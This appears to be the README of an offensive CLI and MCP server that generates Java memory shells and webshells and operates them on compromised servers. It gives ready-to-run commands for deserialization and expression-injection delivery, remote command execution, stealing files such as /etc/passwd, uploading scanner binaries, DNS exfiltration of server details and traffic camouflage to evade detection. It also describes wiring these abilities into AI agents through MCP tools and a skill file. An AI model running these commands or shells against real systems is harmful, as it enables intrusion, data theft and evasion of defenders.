# memshell-party-cli

English | [中文](README.md)

Command-line client **and** MCP server for [MemShellParty](https://party.mem.mk) — generate Java
memory shells and probe shells straight from your terminal (or from an AI agent), talking to the
same HTTP API that powers `party.mem.mk/ui`.

> ⚠️ For authorized security testing, red-team engagements, and research only. You are responsible
> for how you use it.

## Features

- **Interactive wizard** — run `memparty gen` with no flags and pick server / tool / type / packer
  from live, API-driven menus.
- **Fully scriptable** — every option is also a flag, so generation is reproducible in CI or
  scripts; with `--json` even errors come back as structured JSON (`{"ok":false,"error":...}`).
- **REPL** — bare `memparty` starts an interactive loop: many commands in one session,
  with auto-saved target names ready to reuse.
- **MCP server** — `memparty mcp` exposes generation and config as tools for Claude and other MCP clients.
- **All endpoints** — memshell generate, probe generate, config listing, class-name parsing, version.
- **Connection testing** — `memparty connect` verifies a deployed Godzilla / Behinder / suo5 shell
  is alive and the credentials work (echo/handshake round-trip).
- **Command execution** — `memparty exec` runs a command on a deployed Godzilla / Behinder shell
  and prints its output (real `execCommand` / `Cmd` payload round-trip).
- **File transfer** — `memparty upload` / `memparty download` move files through Godzilla /
  Behinder shells, chunked with integrity checks (remote size for Godzilla, MD5 for Behinder).
- **Named targets** — `memparty save` stores shells in projects (with remark + category),
  then `memparty exec web1/bh9060 --cmd "whoami"` needs no flags at all.
- **Operation log** — every gen/probe/connect/exec/download/upload/save/note/remove operation is appended to
  `~/.memparty/operations.jsonl`; `memparty log` queries it by category and target.
- **Flexible output** — payload to stdout by default, or `-o file` (auto base64-decodes `.class`/`.jar`).
- **Any backend** — defaults to the public site, override to your self-hosted instance.
- **Site-mimicking (mimic)** — hand-write a site profile, build a custom shell that blends into real business traffic (`profile` / `custom build` / `demo`), and install the agent skill with `memparty skill install`.

## Install

```bash
npm install -g memshell-party-cli
# or run without installing:
npx memshell-party-cli gen
```

Requires Node.js >= 18.

## Choosing the backend

By priority: `--api` flag → `MEMPARTY_API_URL` env var → `~/.mempartyrc` (`{"apiUrl": "..."}`) →
default `https://party.mem.mk`.

Self-hosting is recommended (see the MemShellParty README for the Docker one-liner):

```bash
memparty --api http://127.0.0.1:8080 gen
# or
export MEMPARTY_API_URL=http://127.0.0.1:8080
```

## Usage

### Interactive

Bare `memparty` starts a REPL: run any subcommand repeatedly in one process — combined with
auto-saved named targets, a whole gen → verify → exec session fits in one go:

```text
memparty> connect -u http://192.0.2.10/shell.jsp -t behinder --header-value my-secret-token
saved as '192.0.2.10/behinder'
memparty> exec 192.0.2.10/behinder --cmd whoami
memparty> list
memparty> exit
```

Passing arguments behaves exactly as before (piped/CI bare `memparty` still prints help).
Inside the REPL: `help` lists commands, `<command> --help` shows examples, `exit`/`quit` leaves.
The `gen` / `probe` wizards work inside the REPL too:

```bash
memparty gen        # wizard for a memory shell (outside the REPL)
memparty probe      # wizard for a probe shell
```

The wizard launches automatically when required flags are missing and you're in a terminal.
Force it anytime with `-i`, or disable it with `--no-interactive`.

### Scripted generation

```bash
# Godzilla listener for Tomcat, single Base64 payload to stdout
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java8

# Write a decoded .class file (base64 decoding is automatic for .class/.jar)
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class

# Command shell with an explicit encryptor
memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec

# Full JSON response (metadata + payload) for further processing
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 --json
```

`--jdk` accepts `java6/8/9/11/17/21`, a bare number (`8`), or a raw class-file major version (`52`).

Note: some packers (e.g. `Base64`) are *aggregate* packers and return several variants at once;
pick a leaf packer (e.g. `DefaultBase64`, `GzipBase64`) for a single payload.

### Discovering options

```bash
memparty config servers          # servers and their shell types
memparty config tools Tomcat     # tools + types for one server
memparty config packers          # packer parent/child tree
memparty config command          # Command encryptors & implementation classes
memparty config servers --json   # machine-readable
```

### Probe shells

```bash
memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req-param-name cmd
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
```

Probe method × content matrix (only these combos are supported by the backend):

| Method `-m` | Supported content `-c` |
|-------------|-------------------------|
| `DNSLog` | `Server`, `JDK` |
| `Sleep` | `Server` |
| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` |

### Testing a deployed shell

`memparty connect` checks whether a shell that is already injected/uploaded actually answers —
it performs the real protocol handshake (Behinder echo, Godzilla payload + `test()` call, suo5
tunnel handshake) and exits 0 on success, 1 on failure.

```bash
# Godzilla (defaults: --pass pass --key key)
memparty connect -u http://target/shell.jsp -t godzilla --pass pass --key key

# Behinder (default: --pass rebeyond)
memparty connect -u http://target/shell.jsp -t behinder --pass rebeyond

# suo5 (auto-detects the v2 handshake vs the legacy v1 echo; force with --suo5-mode v2|v1)
memparty connect -u http://target/suo5.jsp -t suo5
```

Shells generated by MemShellParty are gated by an auth header — the values are in the
`gen --json` output as `shellToolConfig.headerName` / `headerValue` and **must** be passed along
(the Suo5v2 shell checks it too):

```bash
memparty connect -u http://target/x -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value my-secret-token
```

Other flags: `-H "Name: value"` for extra headers, `-k/--insecure` for self-signed TLS,
`--json` for machine-readable output, `--timeout <ms>` (global option).

### Executing commands on a deployed shell

`memparty exec` runs a command line through a deployed Godzilla / Behinder shell and prints the
remote stdout+stderr. It uses the tool's real protocol — Godzilla's `execCommand` payload method
(argv passed as `arg-0..N`, wrapped in `cmd.exe /c` or `/bin/sh -c`) and Behinder's `Cmd` payload
class (which picks the shell itself based on the remote `os.name`).

```bash
# Godzilla — auto-detects the remote OS via getBasicsInfo (one extra request);
# pass --os windows|linux to skip the detection
memparty exec -u http://target/shell.jsp -t godzilla --pass pass --key key --cmd "whoami"

# Behinder — the payload detects the OS itself, no extra request
memparty exec -u http://target/shell.jsp -t behinder --pass rebeyond --cmd "cat /etc/passwd"
```

The gate-header flags are the same as for `connect`; `--json` returns
`{ ok, tool, url, command, output, durationMs }` for automation.

### File upload / download

`memparty upload` / `memparty download` transfer files through a deployed Godzilla / Behinder
shell, using the tool's real protocol (Godzilla's `uploadFile`/`bigFileUpload`/`bigFileDownload`
payload methods; Behinder's `FileOperation` payload class via create+append / downloadPart).
Large files are chunked automatically. Integrity is verified after transfer — the remote size
for Godzilla, the remote MD5 for Behinder — a failed check is an error, not a silent bad file.

```bash
# download: defaults to ./<remote basename>; -o sets the destination
# (an existing directory keeps the remote basename)
memparty download -u http://target/shell.jsp -t godzilla --pass pass --key key \
  --header-value my-secret-token /etc/passwd -o loot/passwd

# an existing local file is never overwritten unless --force is given
memparty download web1 /var/log/app.log --force

# upload: overwrites the remote file (truncate + write), up to 64 MiB
memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
```

Failure semantics are explicit: missing remote file, bad credentials, or an exhausted chunk
retry all exit 1 with a clear message; an aborted upload warns that the remote file may be
partial. `--json` returns `{ ok, tool, url, direction, remotePath, localPath, bytes, durationMs }`.

Non-ASCII paths: always fine on Behinder (paths travel inside the class constant pool, so the
platform charset is irrelevant). Godzilla's payload decodes path parameters with the server's
platform default charset — UTF-8 on JDK 18+ and virtually all Linux, so nothing is needed; on an
old JDK (8/11/17) on Chinese Windows the default is GBK — pass `--remote-charset GBK` (MCP:
`remoteCharset`) for non-ASCII paths there. On Behinder, files over 128 MiB are verified by size
instead of MD5 (the payload's check reads the whole file byte-by-byte). Limits: 2 GiB for
Godzilla (a payload int restriction), 64 MiB for Behinder upload, 2 GiB for Behinder download.

### Saved targets (projects)

Save a shell once, then reference it by name — no more flag soup. Shells live inside
**projects**: a project groups several shells of one engagement and carries an optional
`--remark` and `--category`. The store is `~/.memparty/targets.json`.

```bash
# save (project is created on the fly; --remark/--category are project-level,
# --shell-remark describes this one shell)
memparty save web1/bh9060 -u http://192.0.2.10:9060/console/service \
  -t behinder --pass rebeyond --header-name User-Agent --header-value my-secret-token \
  --remark "内网测试环境 WebSphere" --category test --shell-remark "root 权限"

# list everything (filter with --category <name>)
memparty list

# use: <project>/<shell>, or a bare project name when it holds exactly one shell
memparty connect web1/bh9060
memparty exec web1 --cmd "whoami"

# edit project meta or a shell's remark / clean up
memparty note web1 --remark "new remark" --category prod
memparty note web1/bh9060 --remark "new shell note"
memparty remove web1/bh9060   # one shell
memparty remove web1          # the whole project
```

Explicit flags still override stored values (`memparty exec web1 --cmd id --pass otherpass`).

### Operation log

Every operation (gen, probe, connect, exec, download, upload, save/note/remove) is appended as
one JSON line to `~/.memparty/operations.jsonl` — target, outcome, duration, and for exec the
command plus truncated output. Credentials, payload bytes, and file contents are never logged.

```bash
memparty log                          # latest 50 operations, newest first
memparty log --category exec          # only command executions
memparty log --target web1           # everything against one project (or a host substring)
memparty log --category connect --json
```

## Demos

End-to-end recipes. Pick the **packer** to match your delivery vector, and the **shell type** to
match the target (add the `Jakarta` prefix for Tomcat 10+ / Spring Boot 3; use `Agent*` types with
the `AgentJar*` packers). When in doubt, run `memparty config tools <server>` and
`memparty config packers` first.

### 1. Godzilla webshell on Tomcat 9 (javax)

```bash
# Listener-based Godzilla shell, single base64 payload to stdout
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java8

# ...or write the decoded injector .class straight to disk
memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key -o shell.class
```

### 2. Same shell on Tomcat 10+ / Spring Boot 3 (Jakarta)

```bash
memparty gen -s Tomcat -t Godzilla -y JakartaListener -p DefaultBase64 \
  --godzilla-pass pass --godzilla-key key --jdk java17
```

### 3. Pure command-execution shell (RCE)

```bash
memparty gen -s Tomcat -t Command -y Filter -p DefaultBase64 \
  --command-param-name cmd --encryptor RAW --implementation-class RuntimeExec --jdk java8
```

### 4. Deserialization gadget chain (e.g. CommonsBeanutils ≤ 1.9.4)

```bash
memparty gen -s Tomcat -t Godzilla -y Listener -p JavaCommonsBeanutils19 \
  --godzilla-pass pass --godzilla-key key --jdk java8
# other chains: JavaCommonsBeanutils18/17/16/110, JavaCommonsCollections3/4
```

### 5. Expression-injection delivery (SpEL / OGNL / EL / Groovy …)

```bash
# Spring SpEL injection -> define + load the shell class (Spring uses Interceptor, not Filter)
memparty gen -s SpringWebMvc -t Command -y Interceptor -p SpEL \
  --command-param-name cmd --jdk java8
# OGNL (Struts2), EL, MVEL, Aviator, JEXL, JXPath, Groovy, Velocity, Freemarker, JinJava ...
# (SpEL/OGNL/JXPath are *aggregate* packers — they return several variants at once)
```

### 6. Drop a JSP file

```bash
memparty gen -s Tomcat -t Godzilla -y Listener -p DefineClassJSP \
  --godzilla-pass pass --godzilla-key key --jdk java8 -o shell.jsp
```

### 7. Java-agent memory shell (survives redeploys, hooks deep)

```bash
memparty gen -s Tomcat -t Godzilla -y AgentFilterChain -p AgentJar \
  --godzilla-pass pass --godzilla-key key --jdk java8 -o agent.jar
```

### 8. Fingerprint the target first (blind)

```bash
# DNSLog: confirm code execution + exfil the server/JDK name via DNS
memparty probe -m DNSLog -c Server -p DefaultBase64 --host <your>.dnslog.cn
# Sleep: time-based blind — delays Ns only if the server matches your guess
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5
```

The server name a probe reports is exactly the `-s` value to pass to `memparty gen`.

### Parse a class name

```bash
memparty parse-classname --file shell.class
memparty parse-classname <base64-of-class-bytes>
```

### Version

```bash
memparty version          # CLI version + backend server version
```

## MCP server

Run the CLI as an MCP server over stdio:

```bash
memparty mcp --api http://127.0.0.1:8080
```

Example Claude Code / Claude Desktop config:

```json
{
  "mcpServers": {
    "memshell-party": {
      "command": "npx",
      "args": ["-y", "memshell-party-cli", "mcp"],
      "env": { "MEMPARTY_API_URL": "http://127.0.0.1:8080" }
    }
  }
}
```

Exposed tools: `list_servers`, `list_config`, `list_packers`, `list_command_configs`,
`generate_memshell`, `generate_probe`, `parse_classname`, `server_version`, `connect_test`,
`exec_command`, `download_file`, `upload_file`, `target_save`, `target_note`, `target_list`,
`target_remove`, `log_list`.

## AI skill

The package ships `skills/memshell-party/SKILL.md` — a workflow guide for agents (server / tool /
type / packer decision tree, probe matrix, packer-by-scenario guidance, mimic site profiles, and
common gotchas such as Jakarta vs javax, JDK targeting, aggregate vs leaf packers).

Install with the built-in command (re-run after a CLI upgrade to refresh; restart the agent so it
picks the skill up):

```bash
memparty skill install                  # ~/.agents/skills/memshell-party (default)
memparty skill install --claude         # ~/.claude/skills/memshell-party (Claude Code)
memparty skill install --project        # ./skills/memshell-party
memparty skill install --user --claude  # both user + claude scopes
```

Then ask in natural language, e.g. *"generate a Godzilla listener for Tomcat 10"* or
*"give me a CommonsBeanutils deserialization payload for a Spring Boot 2 app"* — the skill guides
the agent to enumerate options first and pick the right packer for the vector.

## Site-mimicking (mimic)

Build a custom shell whose traffic blends into a real business site. Flow:

```bash
memparty skill install                                    # teach the agent the workflow
memparty profile init acme --site http://192.0.2.1:8080   # skeleton profile to hand-author
memparty custom build --profile acme --server Tomcat       # -> injectable payload
memparty demo                                              # local end-to-end walkthrough
```

`profile` also has `list` / `show` / `check`. Details and camouflage options (body templates, JSON
request bodies, SSE cover streams, etc.) live in the skill.

## Programmatic use

The package also ships a typed API client:

```ts
import { MemPartyClient, buildMemShellRequest } from "memshell-party-cli";

const client = new MemPartyClient({ baseUrl: "http://127.0.0.1:8080" });
const res = await client.generateMemShell(
  buildMemShellRequest({
    server: "Tomcat",
    shellTool: "Godzilla",
    shellType: "Listener",
    packer: "DefaultBase64",
    godzillaPass: "pass",
    godzillaKey: "key",
    jdk: "java8",
  }),
);
console.log(res.memShellResult.shellClassName, res.packResult);
```

## Development

```bash
npm install
npm run build       # tsup -> dist/
npm test            # vitest
npm run typecheck   # tsc --noEmit
```

## License

MIT
